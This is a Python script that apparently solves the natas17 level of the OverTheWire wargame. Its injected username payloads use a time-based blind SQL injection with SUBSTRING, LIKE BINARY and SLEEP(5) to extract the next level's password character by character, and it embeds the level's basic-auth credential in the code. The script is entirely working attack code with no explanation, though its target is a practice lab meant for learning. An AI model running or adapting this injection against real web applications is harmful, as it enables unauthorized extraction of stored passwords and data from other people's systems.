import time
import re
import requests as req
from requests.auth import HTTPBasicAuth

i = 1
LOGIN = 'http://natas17.natas.labs.overthewire.org'
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
passwd = ''

for i in range(1,33):
    for char in chars:
        payload = {'username':'natas18"' + 
                'AND SUBSTRING(password,1,' + str(i) + ')' +
                ' LIKE BINARY"' + passwd + char + '" AND SLEEP(5)#'} 
        start_time = time.time()
        r = req.post(LOGIN, auth=HTTPBasicAuth('natas17',
            '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data=payload)
        if (time.time() - start_time > 5):
            passwd += char
            print (passwd)
            i += 1
            break
